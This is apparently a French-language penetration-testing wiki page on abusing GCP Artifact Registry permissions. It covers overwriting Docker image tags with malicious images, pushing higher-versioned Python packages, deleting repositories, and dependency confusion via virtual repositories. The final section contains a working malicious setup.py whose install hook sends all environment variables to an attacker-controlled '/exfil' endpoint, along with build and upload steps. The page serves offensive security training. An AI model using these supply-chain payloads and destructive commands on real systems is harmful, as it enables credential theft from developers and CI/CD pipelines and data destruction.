# GCP - Artifact Registry Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Artifact Registry

Pour plus d'informations sur Artifact Registry, consultez :

{{#ref}}
../gcp-services/gcp-artifact-registry-enum.md
{{#endref}}

### artifactregistry.repositories.uploadArtifacts

Avec cette permission, un attaquant pourrait téléverser de nouvelles versions des artefacts contenant du code malveillant, comme des images Docker :

<details>
<summary>Téléverser une image Docker vers Artifact Registry</summary>
```bash
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# tag the image to upload it
docker tag <local-img-name>:<local-tag> <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>

# Upload it
docker push <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

> [!CAUTION]
> Il a été vérifié qu'il est **possible d'uploader une nouvelle image docker malveillante** avec le même nom et tag que celle déjà présente, donc la **ancienne perdra le tag** et la prochaine fois que l'image avec ce tag sera **téléchargée, la malveillante sera téléchargée**.

<details>

<summary>Téléverser une bibliothèque Python</summary>

**Commencez par créer la bibliothèque à téléverser** (si vous pouvez télécharger la dernière version depuis le registry vous pouvez éviter cette étape):

1.  **Configurez la structure de votre projet**:

- Créez un nouveau répertoire pour votre bibliothèque, par ex., `hello_world_library`.
- À l'intérieur de ce répertoire, créez un autre répertoire avec le nom de votre package, par ex., `hello_world`.
- Dans le répertoire de votre package, créez un fichier `__init__.py`. Ce fichier peut être vide ou contenir des initialisations pour votre package.

<details>
<summary>Créer la structure du projet</summary>

```bash
mkdir hello_world_library
cd hello_world_library
mkdir hello_world
touch hello_world/__init__.py
```

</details>

2.  **Écrivez le code de votre bibliothèque**:

- Dans le répertoire `hello_world`, créez un nouveau fichier Python pour votre module, par ex., `greet.py`.
- Écrivez votre fonction "Hello, World!" :

<details>
<summary>Créer le module de la bibliothèque</summary>

```python
# hello_world/greet.py
def say_hello():
return "Hello, World!"
```

</details>

3.  **Créez un fichier `setup.py`**:

- À la racine de votre répertoire `hello_world_library`, créez un fichier `setup.py`.
- Ce fichier contient les métadonnées de votre bibliothèque et indique à Python comment l'installer.

<details>
<summary>Créer le fichier setup.py</summary>

```python
# setup.py
from setuptools import setup, find_packages

setup(
name='hello_world',
version='0.1',
packages=find_packages(),
install_requires=[
# Any dependencies your library needs
],
)
```

</details>

**Maintenant, téléversez la bibliothèque :**

1.  **Construisez votre package**:

- Depuis la racine de votre répertoire `hello_world_library`, exécutez :

<details>
<summary>Construire le package Python</summary>

```sh
python3 setup.py sdist bdist_wheel
```

</details>

2.  **Configurez l'authentification pour twine** (utilisé pour téléverser votre package):
- Assurez-vous d'avoir `twine` installé (`pip install twine`).
- Utilisez `gcloud` pour configurer les credentials :

<details>
<summary>Téléverser le package avec twine</summary>
```sh
twine upload --username 'oauth2accesstoken' --password "$(gcloud auth print-access-token)" --repository-url https://<location>-python.pkg.dev/<project-id>/<repo-name>/ dist/*
```
</details>

3. **Nettoyer la compilation**

<details>
<summary>Nettoyer les artefacts de compilation</summary>
```bash
rm -rf dist build hello_world.egg-info
```
</details>

</details>

> [!CAUTION]
> Il n'est pas possible de téléverser une bibliothèque python avec la même version que celle déjà présente, mais il est possible de téléverser des **versions supérieures** (ou d'ajouter un **`.0` à la fin** de la version si cela fonctionne — pas en python cependant —), ou de **supprimer la dernière version et d'en téléverser une nouvelle avec** (nécessite `artifactregistry.versions.delete`)**:**
>
> <details>
> <summary>Delete artifact version</summary>
>
> ```sh
> gcloud artifacts versions delete <version> --repository=<repo-name> --location=<location> --package=<lib-name>
> ```
>
> </details>

### `artifactregistry.repositories.downloadArtifacts`

Avec cette permission, vous pouvez **télécharger des artifacts** et rechercher des **informations sensibles** et des **vulnérabilités**.

Download a **Docker** image:

<details>
<summary>Télécharger une image Docker depuis Artifact Registry</summary>
```sh
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# Dowload image
docker pull <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

Télécharger une bibliothèque **python** :

<details>
<summary>Télécharger une bibliothèque **python** depuis Artifact Registry</summary>
```bash
pip install <lib-name> --index-url "https://oauth2accesstoken:$(gcloud auth print-access-token)@<location>-python.pkg.dev/<project-id>/<repo-name>/simple/" --trusted-host <location>-python.pkg.dev --no-cache-dir
```
</details>

- Que se passe-t-il si des registres distants et standards sont mélangés dans un registre virtuel et qu'un package existe dans les deux ? Consultez cette page:

{{#ref}}
../gcp-persistence/gcp-artifact-registry-persistence.md
{{#endref}}

### `artifactregistry.tags.delete`, `artifactregistry.versions.delete`, `artifactregistry.packages.delete`, (`artifactregistry.repositories.get`, `artifactregistry.tags.get`, `artifactregistry.tags.list`)

Supprimer des artefacts du registre, comme des images docker :

<details>
<summary>Supprimer une image Docker depuis Artifact Registry</summary>
```bash
# Delete a docker image
gcloud artifacts docker images delete <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
</details>

### `artifactregistry.repositories.delete`

Supprimer un dépôt complet (même s'il contient du contenu) :

<details>
<summary>Supprimer le référentiel Artifact Registry</summary>
```
gcloud artifacts repositories delete <repo-name> --location=<location>
```
</details>

### `artifactregistry.repositories.setIamPolicy`

Un attaquant disposant de cette permission pourrait s'accorder des droits pour effectuer certaines des attaques sur les dépôts mentionnées précédemment.

### Pivoting to other Services through Artifact Registry Read & Write

- **Cloud Functions**

When a Cloud Function is created a new docker image is pushed to the Artifact Registry of the project. J'ai essayé de modifier l'image avec une nouvelle, et même de supprimer l'image actuelle (et l'image `cache`) et rien n'a changé, la Cloud Function continue de fonctionner. Par conséquent, il **pourrait être possible d'abuser d'un Race Condition attack** comme avec le bucket pour changer le conteneur docker qui sera exécuté mais **seulement modifier l'image stockée ne permet pas de compromettre la Cloud Function**.

- **App Engine**

Even though App Engine creates docker images inside Artifact Registry. Il a été testé que **même si vous modifiez l'image à l'intérieur de ce service** et supprimez l'instance App Engine (donc une nouvelle est déployée) le **code exécuté ne change pas**.\
Il pourrait être possible qu'en réalisant une **Race Condition attack comme avec les buckets il soit possible d'écraser le code exécuté**, mais cela n'a pas été testé.


### `artifactregistry.repositories.update`
An attacker does not need specific Artifact Registry permissions to exploit this issue—only a vulnerable virtual-repository configuration. Cela se produit lorsqu'un dépôt virtuel combine un dépôt distant public (p. ex., PyPI, npm) avec un dépôt interne, et que la source distante a une priorité égale ou supérieure. Si les deux contiennent un package portant le même nom, le système sélectionne la version la plus élevée. L'attaquant n'a qu'à connaître le nom du package interne et être capable de publier des packages dans le registre public correspondant.

With the `artifactregistry.repositories.update` permission, an attacker could change a virtual repository’s upstream settings to intentionally create this vulnerable setup and use Dependency Confusion as a persistence method by inserting malicious packages that developers or CI/CD systems may install automatically.

The attacker creates a malicious version of the internal package in the public repository with a higher version number. For Python packages, this means preparing a package structure that mimics the legitimate one.
```bash
mkdir /tmp/malicious_package
cd /tmp/malicious_package
PACKAGE_NAME="<package-name>"
mkdir "$PACKAGE_NAME"
touch "$PACKAGE_NAME/__init__.py"
```
Un fichier setup.py est ensuite créé, contenant du code malveillant qui s'exécuterait lors de l'installation. Ce fichier doit spécifier un numéro de version supérieur à celui du dépôt privé.
```bash
cat > setup.py << 'EOF'
import setuptools
from setuptools.command.install import install
import os
import urllib.request
import urllib.parse

def malicious_function():
data = dict(os.environ)
encoded_data = urllib.parse.urlencode(data).encode()
url = 'https://<ip-atacante>/exfil'
req = urllib.request.Request(url, data=encoded_data)
urllib.request.urlopen(req)

class AfterInstall(install):
def run(self):
install.run(self)
malicious_function()

setuptools.setup(
name = "<package-name>",
version = "0.1.1",
packages = ["<package-name>"],
cmdclass={'install': AfterInstall},
)
EOF
```
Construisez le package et supprimez le wheel afin de garantir que le code est exécuté lors de l'installation.
```bash
python3 setup.py sdist bdist_wheel
rm dist/<package-name>*.whl
```
Téléversez le paquet malveillant dans le dépôt public (par exemple, test.pypi.org pour Python).
```bash
pip install twine
twine upload --repository testpypi dist/*
```
Lorsqu'un système ou un service installe le package en utilisant le dépôt virtuel, il téléchargera la version malveillante depuis le dépôt public plutôt que la version interne légitime, car la version malveillante a un numéro de version supérieur et le dépôt distant a une priorité égale ou supérieure.

{{#include ../../../banners/hacktricks-training.md}}
